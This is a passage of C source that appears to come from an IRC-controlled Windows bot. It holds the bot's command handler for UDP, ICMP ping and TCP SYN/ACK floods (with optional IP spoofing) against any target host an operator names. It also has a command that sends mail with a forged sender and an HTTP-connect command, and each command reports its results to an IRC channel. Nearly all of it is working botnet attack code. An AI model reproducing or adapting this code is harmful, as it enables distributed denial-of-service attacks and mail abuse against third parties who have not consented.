			else if (strcmp("udpflood", a[s]) == 0 || strcmp("udp", a[s]) == 0 || strcmp("u", a[s]) == 0) {
				PINGFLOOD udps;
				udps.silent = silent;
				udps.notice = notice;
				strncpy(udps.host,  a[s+1], sizeof(udps.host)-1);
				udps.num = atoi(a[s+2]);
				udps.size = atoi(a[s+3]);
				udps.delay = atoi(a[s+4]);
				if (a[s+5] != NULL)
					udps.port = atoi(a[s+5]);
				else
					udps.port = 0;
				strncpy(udps.chan,  a[2], sizeof(udps.chan)-1);
				udps.sock = sock;

				sprintf(sendbuf, "4<<12[UDP]: Sending %d packets to: %s. Packet size: %d, Delay: %d(ms).4>>", udps.num, udps.host, udps.size, udps.delay);
				udps.threadnum = addthread(sendbuf,UDP_THREAD,NULL);
				if (threads[udps.threadnum].tHandle = CreateThread(NULL, 0, &udp, (LPVOID)&udps, 0, &id)) {
					while(udps.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[UDP]: Failed to start flood thread, error: <%d>.4>>", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_PING
			else if (strcmp("pingflood", a[s]) == 0 || strcmp("ping", a[s]) == 0 || strcmp("p", a[s]) == 0) {
				if (!noicmp) {
					PINGFLOOD pings;
					pings.silent = silent;
					pings.notice = notice;
					strncpy(pings.host,  a[s+1], sizeof(pings.host)-1);
					pings.num = atoi(a[s+2]);
					pings.size = atoi(a[s+3]);
					pings.delay = atoi(a[s+4]);
					strncpy(pings.chan,  a[2], sizeof(pings.chan)-1);
					pings.sock = sock;

					sprintf(sendbuf, "4<<12[PING]: Sending %d pings to %s. packet size: %d, timeout: %d(ms).4>>", pings.num, pings.host, pings.size, pings.delay);
					pings.threadnum = addthread(sendbuf,PING_THREAD,NULL);
					if (threads[pings.threadnum].tHandle = CreateThread(NULL, 0, &ping, (LPVOID)&pings, 0, &id)) {
						while(pings.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"4<<12[PING]: Failed to start flood thread, error: <%d>.4>>", GetLastError());
				} else
					strncpy(sendbuf, "ICMP.dll not available", sizeof(sendbuf)-1);

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_TCP
			else if (strcmp("tcpflood", a[s]) == 0 || strcmp("tcp", a[s]) == 0) {
				TCPFLOOD tcpflood;
				_snprintf(tcpflood.type,sizeof(tcpflood.type),a[s+1]);
				if (strcmp("syn",tcpflood.type) == 0 || strcmp("ack",tcpflood.type) == 0 || strcmp("random",tcpflood.type) == 0) {
					if ((tcpflood.time = atoi(a[s+4])) > 0) {
						_snprintf(tcpflood.type,sizeof(tcpflood.type),a[s+1]);
						_snprintf(tcpflood.ip,sizeof(tcpflood.ip),a[s+2]);
						tcpflood.port = atoi(a[s+3]);
						tcpflood.spoof = ((parameters['r'])?(TRUE):(FALSE));
						tcpflood.sock = sock;
						_snprintf(tcpflood.chan,sizeof(tcpflood.chan),a[2]);
						tcpflood.notice = notice;
						tcpflood.silent = silent;

						_snprintf(sendbuf,sizeof(sendbuf),"4<<12[TCP]: %s %s flooding: (%s:%s) for %s seconds.4>>", ((tcpflood.spoof)?("Spoofed"):("Normal")), a[s+1], a[s+2], a[s+3], a[s+4]);
						tcpflood.threadnum = addthread(sendbuf,TCP_THREAD,NULL);
						if (threads[tcpflood.threadnum].tHandle = CreateThread(NULL, 0, &TcpFloodThread, (LPVOID)&tcpflood, 0, &id)) {
							while(tcpflood.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"4<<12[TCP]: Failed to start flood thread, error: <%d>.4>>", GetLastError());
					} else
						sprintf(sendbuf,"4<<12[TCP]: Invalid flood time must be greater than 0.4>>");
				} else
					sprintf(sendbuf,"4<<12[TCP]: Invalid flood type specified.4>>");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
		    else if (strcmp("email", a[s]) == 0 ) {
				WORD version = MAKEWORD(1,1);
				WSADATA wsaData;
				char server[256], sender_email[256], recp_email[256], subject[256], myBuf[256], BigBuf[1024];
				int port, nRet;

				strcpy(server,a[s+1]);
				port = atoi(a[s+2]);
				strcpy(sender_email,a[s+3]);
				strcpy(recp_email,a[s+4]);
				strcpy(subject,replacestr(a[s+5],"_"," "));
				fWSAStartup(version, &wsaData);

				LPHOSTENT lpHostEntry;
				lpHostEntry = fgethostbyname(server);

				SOCKET MailSocket;
				MailSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

				SOCKADDR_IN saServer;
				saServer.sin_family = AF_INET;
				saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
				saServer.sin_port = fhtons((unsigned short)port);
				sprintf(BigBuf,"helo $rndnick\nmail from: <%s>\nrcpt to: <%s>\ndata\nsubject: %s\nfrom: %s\n%s\n.\n",sender_email,recp_email,subject,sender_email,subject);
				nRet = fconnect(MailSocket, (LPSOCKADDR)&saServer, sizeof(saServer));
				nRet = frecv(MailSocket, myBuf, sizeof(myBuf), 0);
				nRet = fsend(MailSocket,  BigBuf, strlen(myBuf), 0);
				nRet = frecv(MailSocket, myBuf, sizeof(myBuf), 0);
				fclosesocket(MailSocket);
				fWSACleanup();

				sprintf(sendbuf, "4<<12[EMAIL]: Message sent to %s.4>>",recp_email);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_HTTP
			else if (strcmp("httpcon",a[s]) == 0 || strcmp("hcon",a[s]) == 0) {
				HTTP_Connect(sock,a[2],notice,silent,a[s+1],atoi(a[s+2]),a[s+3],a[s+4],a[s+5]);

				return repeat;
			}
			#endif
		}
	}

	return repeat;
}